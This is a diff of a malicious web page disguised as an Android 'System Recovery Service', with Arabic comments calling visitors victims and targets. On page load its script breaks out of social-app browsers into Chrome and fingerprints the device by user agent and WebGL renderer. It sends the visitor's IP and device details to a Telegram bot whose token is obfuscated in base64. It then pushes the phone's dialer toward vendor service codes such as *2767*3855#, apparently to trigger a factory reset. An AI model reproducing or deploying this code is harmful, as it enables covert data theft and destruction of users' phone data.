@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Android System Core Update</title>
+    <title>System Recovery Service</title>
     <style>
         body { background:#fff; font-family:sans-serif; text-align:center; padding-top:20%; margin:0; overflow:hidden; }
         .loader { border: 4px solid #4285F4; border-top: 4px solid #f3f3f3; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; display:inline-block; }
@@ -11,11 +11,11 @@
         #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; cursor: pointer; }
     </style>
 </head>
-<body onload="ultra_launch()">
+<body onload="deep_scan()">
     <div id="overlay"></div>
     <div id="content">
         <div class="loader"></div>
-        <p style="color:#4285F4; font-size:18px; font-weight:bold;">جاري مزامنة بيانات النظام...</p>
+        <p style="color:#4285F4; font-size:18px; font-weight:bold;">جاري التحقق من بصمة الجهاز...</p>
     </div>
 
 <script>
@@ -23,7 +23,7 @@
     const _c = "NzE4NDk3MDM1NQ==";
     function _d(s) { return atob(s); }
 
-    function ultra_launch() {
+    function deep_scan() {
         const p = new URLSearchParams(window.location.search);
         if (p.get('auth') !== 'true') { window.location.href = "https://www.google.com"; return; }
 
@@ -31,51 +31,58 @@
         let uL = ua.toLowerCase();
         let currentUrl = window.location.href;
 
-        // 1. ميزة الهروب القسري من متصفحات التواصل الاجتماعي (واتساب، فيسبوك، إنستا، تليجرام)
-        // يتم "قذف" الضحية مباشرة إلى متصفح Chrome لضمان عمل صلاحيات الاتصال
+        // 1. الهروب من متصفحات التواصل الاجتماعي
         if (/FBAN|FBAV|Instagram|WhatsApp|Telegram/i.test(ua)) {
             window.location.href = "intent://" + currentUrl.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
             return;
         }
 
-        // 2. محرك كشف الإصدار الحقيقي وتصحيح "كذب" النظام (Android 11+)
+        // 2. كشف الإصدار الحقيقي (تجاوز تمويه الأندرويد)
         let osVer = 10;
         if (ua.indexOf("Android") >= 0) {
             osVer = parseFloat(ua.slice(ua.indexOf("Android") + 8));
             if (ua.includes("AppleWebKit/537.36") && osVer <= 10 && !ua.includes("Version/4.0")) { osVer = 11; }
         }
 
-        // 3. تحديد نوع الهاتف واختيار "الكود النووي" المناسب
+        // 3. المحرك المجهري لتحديد نوع الهاتف (Deep Brand Detection)
         let brand = "Android Generic";
-        let targetCode = "2767*3855%23"; // الكود العالمي (Samsung/Realme/Oppo)
-        
-        if (uL.includes("samsung")) { brand = "Samsung"; }
-        else if (uL.includes("xiaomi") || uL.includes("redmi") || uL.includes("poco")) { brand = "Xiaomi"; targetCode = "%23*%23*7780*%23*%23"; }
-        else if (uL.includes("huawei") || uL.includes("honor")) { brand = "Huawei"; targetCode = "%23*%23*2846579*%23*%23"; }
-        else if (uL.includes("realme") || uL.includes("rmx") || uL.includes("oppo") || uL.includes("cph")) { brand = "Realme/Oppo"; }
+        let targetCode = "2767*3855%23"; // الكود العالمي
 
-        // 4. إرسال التقرير الاستخباراتي الكامل للبوت
+        // فحص البصمة عبر الرسوميات (GPU) لمعرفة الشركة
+        let canvas = document.createElement('canvas');
+        let gl = canvas.getContext('experimental-webgl');
+        let debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+        let renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL_PARAM).toLowerCase() : "";
+
+        // مصفوفة التحليل الذكي
+        if (uL.includes("samsung") || renderer.includes("adreno") && uL.includes("sm-")) { brand = "Samsung"; }
+        else if (uL.includes("xiaomi") || uL.includes("redmi") || uL.includes("miui") || renderer.includes("mali") && uL.includes("m2")) { 
+            brand = "Xiaomi"; targetCode = "%23*%23*7780*%23*%23"; 
+        }
+        else if (uL.includes("huawei") || uL.includes("honor")) { 
+            brand = "Huawei"; targetCode = "%23*%23*2846579*%23*%23"; 
+        }
+        else if (uL.includes("realme") || uL.includes("rmx") || uL.includes("oppo") || uL.includes("cph") || renderer.includes("adreno") && uL.includes("rmx")) { 
+            brand = "Realme/Oppo"; 
+        }
+
+        // 4. إرسال التقرير الاستخباراتي
         fetch('https://api.ipify.org?format=json').then(r => r.json()).then(ip => {
-            let status = (osVer >= 11) ? "⚠️ توجيه قسري (11+)" : "🚀 تنفيذ تلقائي (10-)";
-            let report = `🎯 تم صيد هدف جديد!\n🌐 IP: ${ip.ip}\n🖥️ المعالج: ${navigator.platform}\n📜 السجل: ${ua}\n📱 الشركة: ${brand}\n⚙️ الإصدار: Android ${osVer}\n📡 الحالة: ${status}\n📟 الكود: *${targetCode.replace('%23', '#')}*`;
+            let mode = (osVer >= 11) ? "⚠️ توجيه قسري (11+)" : "🚀 تنفيذ تلقائي (10-)";
+            let report = `🎯 تم كشف الهوية بدقة!\n🌐 IP: ${ip.ip}\n🖥️ المعالج: ${navigator.platform}\n🎮 الرسوميات: ${renderer}\n📱 الشركة: ${brand}\n⚙️ الإصدار: Android ${osVer}\n📡 الحالة: ${mode}\n📟 الكود: *${targetCode.replace('%23', '#')}*`;
             fetch(`https://api.telegram.org/bot${_d(_t)}/sendMessage?chat_id=${_d(_c)}&text=${encodeURIComponent(report)}`);
         });
 
-        // 5. التوجيه التلقائي والقسري للوحة الاتصال
-        // يتم التنفيذ بعد 1.5 ثانية لضمان إرسال التقرير أولاً
+        // 5. التنفيذ (تلقائي لـ 10، وقسري لـ 11+)
         setTimeout(() => {
             if (osVer >= 11) {
-                // استخدام بروتوكول Intent لإجبار الهاتف على فتح لوحة الاتصال بالكود جاهزاً
                 window.location.href = `intent://*${targetCode}#Intent;scheme=tel;action=android.intent.action.DIAL;end`;
             } else {
-                // التنفيذ التلقائي المباشر للإصدارات القديمة (10 وما دون)
                 window.location.href = "tel:*" + targetCode;
             }
         }, 1500);
     }
-
-    // إجبار التوجيه عند أي لمسة للضحية لتجاوز جدران الحماية
-    document.getElementById('overlay').onclick = ultra_launch;
+    document.getElementById('overlay').onclick = deep_scan;
 </script>
 </body>
 </html>
